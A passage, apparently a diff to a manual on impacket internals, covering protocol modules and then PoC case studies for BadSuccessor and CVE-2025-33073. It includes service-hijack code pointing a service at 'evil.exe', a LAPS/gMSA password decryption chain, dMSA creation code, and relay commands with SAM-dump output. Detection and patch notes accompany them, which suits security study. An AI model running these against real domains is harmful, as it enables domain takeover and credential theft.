+    def registerAuthScheme(self, scheme): ...          # register a locally supported mechanism
+
+    def createInitialToken(self, optimisticToken=None):
+        # build INITIATOR_NEGO; an optimisticToken can save a round trip ([MS-NEGOEX] 3.1.5.4)
+        ...
+
+    def processToken(self, data):
+        # parse the peer token, advance the state machine, return the exchange payload for the mechanism
+        ...
+
+    def _processVerify(self, verifyMsg):
+        # validate the VERIFY RFC3961 checksum using the key the scheme provides
+        keyUsage = NEGOEX_KEYUSAGE_ACCEPTOR if self.isInitiator else NEGOEX_KEYUSAGE_INITIATOR
+        expected = make_checksum(checksumType, Key(enctype, keyBytes), keyUsage, b''.join(self._messageHistory))
+        ...
+```
+
+The checksum uses the RFC 3961 key usage numbers: **23 when signed by the initiator, 25 when signed by the acceptor**. `parseNegoExToken` is the most practical piece here - it splits a NEGOEX token into an ordered list of messages, each carrying its raw bytes (`raw_data`), which is convenient for protocol analysis or checksum recomputation:
+
+```python
+from impacket.negoex import parseNegoExToken, MESSAGE_TYPE
+
+for pm in parseNegoExToken(token_bytes):
+    if pm.getMessageType() == MESSAGE_TYPE.INITIATOR_NEGO:
+        print(pm.message.getAuthSchemeList())   # peer-supported auth scheme GUID list
+```
+
+For attack research, NEGOEX matters because it puts the alternative authentication mechanisms on the table: in 0.13.1, `ntlmrelayx` deliberately **stopped advertising NEGOEX to SMB peers** (ChangeLog: "avoiding unsupported NEGOEX advertisement"), precisely because an inappropriate NEGOEX advertisement changes the negotiation outcome and interferes with relaying. Understanding this state machine is the key to judging "will this negotiation end in Kerberos or NTLM". `example/negoex_parse_token.py` shows how to recompute the checksum from a hex token.
+
+> Version note: as of writing, `negoex.py` is still an unreleased master feature (0.14.0.dev); the API may shift, so use it for research and parsing rather than production.
+
+### 8.4 [MS-RAA] raa.py - Remote Authorization Enumeration
+
+[MS-RAA] (Remote Authorization API Protocol) lifts the local Windows Authz API onto RPC. Its most elegant property: **you can send a security descriptor to the server and directly ask "for this identity (SID), what does this descriptor actually grant?" - with the server performing all inheritance and ScopedPolicyID stripping.** This is far more precise than hand-rolling DACL logic locally, and is especially useful for permission confirmation before an attack like BadSuccessor.
+
+```python
+MSRPC_UUID_RAA = uuidtup_to_bin(('0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7', '0.0'))
+
+# Two object UUIDs: the latter disables the server-side stripping
+# of SYSTEM_SCOPED_POLICY_ID_ACEs from the security descriptor.
+RAA_OBJECT_UUID_DEFAULT           = '9a81c2bd-a525-471d-a4ed-49907c0b23da'
+RAA_OBJECT_UUID_NO_SCOPED_POLICY  = '5fc860e0-6f6e-4fc2-83cd-46324f25e90b'
+```
+
+The interface has seven opnums:
+
+```python
+OPNUMS = {
+    0 : (AuthzrFreeContext, AuthzrFreeContextResponse),
+    1 : (AuthzrInitializeContextFromSid, AuthzrInitializeContextFromSidResponse),   # SID -> authz context
+    2 : (AuthzrInitializeCompoundContext, AuthzrInitializeCompoundContextResponse), # user+device compound context
+    3 : (AuthzrAccessCheck, AuthzrAccessCheckResponse),   # the core: access decision on a security descriptor
+    4 : (AuthzGetInformationFromContext, AuthzGetInformationFromContextResponse),   # group memberships / claims
+    5 : (AuthzrModifyClaims, AuthzrModifyClaimsResponse),
+    6 : (AuthzrModifySids, AuthzrModifySidsResponse),
+}
+```
+
+The test case (`tests/dcerpc/test_raa.py`) shows the interface runs over **`ncacn_ip_tcp` and requires `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`**, since the server must act on the caller's identity. The typical flow is to turn a SID into a context with `hAuthzrInitializeContextFromSid`, then call `hAuthzrAccessCheck` with the security descriptor and the desired access mask:
+
+```python
+sid_ctx = raa.hAuthzrInitializeContextFromSid(dce, target_sid, flags=raa.AUTHZ_COMPUTE_PRIVILEGES)
+resp = raa.hAuthzrAccessCheck(dce, sid_ctx['ContextHandle'], securityDescriptor, desiredAccess,
+                              objectTypeList=[], resultListLength=1)
+granted = resp['pReply']['GrantedAccessMask'][0]   # the server-computed final authorization result
+```
+
+With it, questions such as "does this ordinary user have `CreateChild` (0x1) on this OU, or the right to create an `msDS-DelegatedManagedServiceAccount`" can be answered by the server directly, instead of you implementing a (bug-prone) ACL inheritance algorithm yourself. `example/raa_enum_permissions.py` uses it to decide whether a given SID can create child objects under a target OU.
+
+### 8.5 [MS-SCMR] scmr.py - Service Control Manager
+
+[MS-SCMR] is the remote service management protocol, on the `\pipe\svcctl` endpoint. It is the layer under `psexec.py` / `smbexec.py` / `services.py` - **lateral movement in a domain almost always ends in "start a service on the target"**, so it cannot be skipped.
+
+```python
+MSRPC_UUID_SCMR = uuidtup_to_bin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0'))
+```
+
+The module ships a coherent set of helpers covering the service lifecycle:
+
+```python
+from impacket.dcerpc.v5 import scmr
+
+# open the SCM database -> open/create a service -> start/control it
+scHandle = scmr.hROpenSCManagerW(dce, 'DUMMY\x00', 'ServicesActive\x00', scmr.SC_MANAGER_ALL_ACCESS)['lpScHandle']
+svcHandle = scmr.hROpenServiceW(dce, scHandle, 'MyService\x00')
+scmr.hRQueryServiceStatus(dce, svcHandle)
+scmr.hRQueryServiceConfigW(dce, svcHandle)      # query the binary path and other config
+scmr.hRChangeServiceConfigW(dce, svcHandle, lpBinaryPathName='C:\\evil.exe\x00')
+scmr.hRStartServiceW(dce, svcHandle)
+```
+
+A common "write your own script" scenario is to **enumerate services and note those with a writable binary path for DLL hijacking / service replacement**:
+
+```python
+resp = scmr.hREnumServicesStatusW(dce, scHandle)
+for svc in resp['lpServiceStatus']:
+    cfg = scmr.hRQueryServiceConfigW(dce, scmr.hROpenServiceW(dce, scHandle, svc['lpServiceName'])['lpServiceHandle'])
+    print(svc['lpServiceName'], cfg['lpServiceConfig']['lpBinaryPathName'])
+```
+
+> Version note: 0.13.1 fixed SCMR "failure action" marshaling (ChangeLog #2046/#2152); if `RChangeServiceConfig2W` used to throw when setting failure actions on an older version, upgrading resolves it.
+
+### 8.6 acl.py - ACL Helpers for SMB/NTFS
+
+0.13.1 added a **reusable** ACL helper module, `impacket/acl.py` (by Gefen Altshuler). Previously, modifying a remote file's ACL meant constantly converting between `ldaptypes` and `smb3structs`; now this is wrapped into classes such as `SecurityAttributes` and `SMBFileACL`, reusing `ldaptypes`' ACE/DACL structures.
+
+```python
+# Supported permission shorthands mapped to NT access masks
+SUPPORTED_PERMISSIONS = {
+    "R": 0x00120089,   # read
+    "W": 0x00100116,   # write
+    "D": 0x00110000,   # delete
+    "X": 0x00000020,   # execute
+    "F": 0x001F01FF,   # full control
+}
+```
+
+It targets the "read/write file security descriptors over SMB" scenario and pairs with the ACL management that 0.13.1 added to `smbclient.py`. (use the ACL commands built into upstream `examples/smbclient.py`; there is no need to re-implement this locally.) The point of this module is that **it extends "ACL manipulation" from the LDAP scenario to the SMB file scenario**, filling the gap left by `dacledit` (LDAP only) with no SMB-side tool.
+
+### 8.7 dpapi_ng.py - DPAPI Next Generation (CNG)
+
+`impacket/dpapi_ng.py` implements the DPAPI-NG (a.k.a. DPAPI CNG) decryption flow. It is upstream/downstream of `gkdi.py`: **GKDI fetches the group key envelope, and dpapi_ng uses it to unprotect the data.** It covers gMSA / dMSA `msDS-ManagedPassword`, Windows LAPS v2 `msLAPS-EncryptedPassword`, and certificate private keys (`msDS-KeyCredentialLink`).
+
+The key functions form a clear chain:
+
+```python
+def SP800_108_Counter(master, key_len, prf, num_keys=None, label=b'', context=b''): ...
+def compute_kdf_context(key_guid, l0, l1, l2): ...
+def compute_l2_key(key_id: KeyIdentifier, gke: GroupKeyEnvelope): ...
+def compute_kek(gke: GroupKeyEnvelope, key_id: KeyIdentifier): ...      # derive the KEK from the GKE
+def aes_unwrap(wrapping_key: bytes, wrapped_key: bytes): ...
+def unwrap_cek(kek, encrypted_cek): ...
+def decrypt_plaintext(cek, iv, encrypted_blob): ...
+```
+
+The KDF uses NIST SP 800-108 counter mode (`SP800_108_Counter`) with fixed labels such as `KDS service` (for KEK derivation):
+
+```python
+KDS_SERVICE_LABEL  = "KDS service\0".encode("utf-16-le")
+KEK_PUBLIC_KEY_LABEL = "KDS public key\0".encode("utf-16le")
+```
+
+The full decryption chain can be read straight from `examples/GetLAPSPassword.py`:
+
+```python
+# 1. read msLAPS-EncryptedPassword from LDAP (EncryptedPasswordBlob)
+blob = EncryptedPasswordBlob(rawEncryptedLAPSBlob)
+key_id = blob['KeyIdentifier']
+# 2. fetch the GroupKeyEnvelope via GKDI (see 8.2)
+gke = GroupKeyEnvelope(b''.join(GkdiGetKey(...)['pbbOut']))
+# 3. derive the KEK -> unwrap the CEK -> decrypt the plaintext
+kek = compute_kek(gke, key_id)
+cek = unwrap_cek(kek, blob['EncryptedCek'])
+plaintext = decrypt_plaintext(cek, blob['Iv'], blob['EncryptedBlob'])
+```
+
+This chain is the **generic recipe for reading Windows LAPS v2 and gMSA/dMSA managed passwords**. A complete runnable example is upstream `examples/GetLAPSPassword.py` (its `getLAPSv2Decrypt` is exactly this chain).
+
+## Chapter 9 Case Studies: Writing PoCs for the Latest Vulnerabilities with impacket
+
+This chapter picks two of the most representative recent cases: **BadSuccessor** (abusing the dMSA account type introduced in Windows Server 2025 to take over a domain) and **CVE-2025-33073** (reflective relay straight to SYSTEM). The first shows how to write an attack script with LDAP and a hand-built security descriptor; the second shows how to understand and reproduce the latest relay workflow that impacket's relay framework supports.
+
+### 9.1 BadSuccessor (CVE-2025-53779): Taking Over a Domain via dMSA
+
+**Background.** On 21 May 2025, Akamai researcher Yuval Gordon published **BadSuccessor**; shortly after the DEF CON 2025 talk, Microsoft assigned it **CVE-2025-53779** and shipped a patch. It does not abuse a memory-corruption bug, but rather a new account type introduced in Windows Server 2025 - the **delegated Managed Service Account (dMSA)**. dMSA was designed to make it easy to "migrate" legacy service accounts into managed accounts; but the researcher found that **the inheritance of a migration relationship hinges entirely on a single attribute, `msDS-ManagedAccountPrecededByLink`, and the KDC never validates whether that "bloodline" is real.**
+
+**Mechanism.** As long as an attacker holds `CreateChild` ("create all child objects") or the right to create `msDS-DelegatedManagedServiceAccount` on **any OU**, they can create a dMSA in that OU, then point its `msDS-ManagedAccountPrecededByLink` at any target account (Domain Admins, domain controllers, Protected Users, even "sensitive and cannot be delegated" accounts) and set the migration state to "completed". The KDC then treats the dMSA as the target's "successor": it merges the target's **entire group membership into the dMSA's PAC**, and returns the target's **Kerberos keys in the dMSA key package**. In 91% of the environments Akamai examined, users outside the Domain Admins group already had the required permissions.
+
+The key attributes:
+
+| Attribute | Role |
+| :--- | :--- |
+| `objectClass` = `msDS-DelegatedManagedServiceAccount` | the dMSA object class |
+| `msDS-DelegatedMSAState` = 2 | migration state (2 means "migration complete") |
+| `msDS-ManagedAccountPrecededByLink` | DN of the "inherited" account - the core of the attack |
+| `msDS-GroupMSAMembership` | who may retrieve the managed password (a security descriptor) |
+| `msDS-ManagedPasswordInterval` | password rotation interval |
+
+**impacket's tooling.** `examples/badsuccessor.py` implements four actions - `search` / `add` / `delete` / `modify`. The `search` action is the equivalent of Akamai's `Get-BadSuccessorOUPermissions.ps1`: it walks every OU's `nTSecurityDescriptor` and finds identities that hold the relevant rights over `msDS-DelegatedManagedServiceAccount` (GUID `0feb936f-47b3-49f2-9386-1dedc2c23765`).
+
+```python
+# eg.examples/badsuccessor.py (excerpt: ACL decision in search_ous)
+relevant_rights = {
+    "CreateChild": 0x00000001,
+    "GenericAll":  0x10000000,
+    "WriteDACL":   0x00040000,
+    "WriteOwner":  0x00080000,
+}
+relevant_object_types = {
+    "00000000-0000-0000-0000-000000000000": "All Objects",
+    "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
+}
+
+sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)     # parse the OU security descriptor
+for ace in sd['Dacl'].aces:
+    if ace['AceType'] not in (ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE,
+                              ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
+        continue
+    mask = int(ace['Ace']['Mask']['Mask'])
+    if not any(mask & right for right in relevant_rights.values()):
+        continue
+    # object-specific ACEs must also match the dMSA ObjectType GUID
+    ace_data = ace['Ace']
+    if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
+        object_guid = str(uuid.UUID(bytes_le=ace_data['ObjectType'])).lower()
+        if object_guid not in relevant_object_types:
+            continue
+    ...
+```
+
+The `add` action demonstrates the full "hand-build a security descriptor + create the object" pattern - exactly the "write your own PoC" ability this manual keeps emphasising: first build an `nTSecurityDescriptor` that only lets the attacker retrieve the password, then write the whole attribute set above in one call.
+
+```python
+# eg.examples/badsuccessor.py (excerpt: attributes and creation call in add_dmsa)
+attributes = {
+    'cn': self.__dmsaName,
+    'sAMAccountName': '%s$' % self.__dmsaName,
+    'dNSHostName': dns_hostname,
+    'userAccountControl': 4096,
+    'msDS-ManagedPasswordInterval': 30,
+    'msDS-DelegatedMSAState': 2,                       # migration "complete"
+    'msDS-SupportedEncryptionTypes': 28,
+    'accountExpires': 9223372036854775807,
+    'msDS-GroupMSAMembership': group_msa_membership,   # who may read the managed password
+    'msDS-ManagedAccountPrecededByLink': target_dn,    # the inherited account
+}
+success = ldapConnection.add(dmsa_dn, ['msDS-DelegatedManagedServiceAccount'], attributes=attributes)
+```
+
+**After the patch.** Microsoft added validation in `kdcsvc.dll`: a one-way link is no longer honoured by the KDC - the pairing must be **mutual** (the target also references the dMSA, as a real migration would produce) before a ticket is issued. But the link attribute itself gained no protection, so BadSuccessor survives as a **technique**: where the target object is already controlled, it still works as a "shadow credentials" alternative or a DCSync alternative for stealing credentials. Detection points include: Event 5137 (dMSA creation), 5136 (`msDS-ManagedAccountPrecededByLink` modification), 2946 (TGT issued for a dMSA), and 4662 (object operation).
+
+**Use the upstream tool.** The `search` action of upstream `examples/badsuccessor.py` already performs the equivalent permission reconnaissance (the counterpart of Akamai's `Get-BadSuccessorOUPermissions.ps1`).
+
+### 9.2 CVE-2025-33073: Reflective Relay, SYSTEM in One Step
+
+**Background.** **CVE-2025-33073** was discovered by RedTeam Pentesting in January 2025 (independently reproduced by Synacktiv and others), assigned on 2025-05-30, and fixed in the June 2025 Patch Tuesday. Microsoft described it as an "SMB client elevation of privilege", but as Synacktiv pointed out, it is really **authenticated remote command execution as SYSTEM against any machine that does not enforce SMB signing**. It revives NTLM reflection - believed dead since MS08-068 - and extends it to **Kerberos**.
+
+**Mechanism: the CMTI trick plus reflection.** The attack has three steps:
+
+1. **Register a "special" DNS record.** Leveraging James Forshaw's `CREDENTIAL_TARGET_INFORMATION` (CMTI) idea, a serialized target-information blob can be appended to the end of an SPN. So you register a record like `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` (where `1UWhRCAAAA...` is the marshalled target information) pointing to the attacker. **Any authenticated user is allowed to create DNS records in the domain by default** (with ADIDNS).
+2. **Coerce authentication.** Using a coercion primitive such as PetitPotam, lure the target machine (a service running as SYSTEM) into an SMB authentication to the host behind that record. Before building the authentication, LSASS **discards** the trailing marshalled portion, leaving just `srv1` - so it "believes" it is performing local authentication and handles it as local NTLM (copying the SYSTEM token into the server context) or Kerberos (the subkey hitting `KERB_LOCAL`).
+3. **Relay back to itself.** Relay that authentication to the target's own SMB service to obtain a SYSTEM session, then remotely edit the registry or dump SAM.
+
+```text
+# 1. add the CMTI DNS record (any domain user can do this)
+#    dnstool.py -u 'CORP\lowpriv' -p <pass> -a add -d <attacker_ip> \
+#        -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA <dc_ip>
+# 2. coerce authentication + 3. relay back to itself
+#    ntlmrelayx.py -t smb://SRV1.CORP.LOCAL -smb2support
+[*] Authenticating against smb://SRV1.CORP.LOCAL as / SUCCEED
+[*] Target system bootKey: 0x0c10b250470be78cbe1c92d1b7fe4e91
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
+```
+
+**Preconditions.** The only requirement is that the target **does not enforce SMB signing** - servers enable signing by default only on domain controllers, and clients only since Windows 11 24H2, so a great many servers/clients remain exposed. **Enabling SMB signing blocks the attack** (even without the patch).
+
+**impacket's support.** 0.13.1 added the "remove NTLM sign/seal" paths that the CVE-2025-33073-related relay workflow needs to `ntlmrelayx.py` (the `--remove-mic` handling), and promptly fixed **CVE-2025-53778** (reflection bypassing channel binding, CBT, for HTTPS/WinRM/MSSQL). These details live directly in the relay servers and SOCKS plugins under `impacket/examples/ntlmrelayx`.
+
+**Patch and status quo.** Microsoft added a check to `mrxsmb!SmbCeCreateSrvCall` that aborts an SMB connection whenever the target name contains marshalled target information. But in 2026 Synacktiv further showed that the patch only closed the CMTI trick in the SMB client; new coercion primitives based on Unicode normalisation / custom ports then appeared (CVE-2026-24294, CVE-2026-26128, ...). **The authentication-reflection vulnerability class is far from over.** Defensively, "enforce SMB signing in the domain + close/audit ADIDNS record creation + reduce coercion primitives" is the most sensible combination.
+
+> Summary: both cases say the same thing - **once a protocol path is open, its attack surface keeps being rediscovered.** BadSuccessor is a reminder to watch the KDC's trust assumptions about a "migration relationship"; CVE-2025-33073 is a reminder that "a mitigation (NTLM reflection protection) is not a cure". impacket can keep up so quickly precisely because its modular implementation slices every protocol primitive finely enough - which is why this manual spent seven chapters dissecting the source.
 
 References:
 
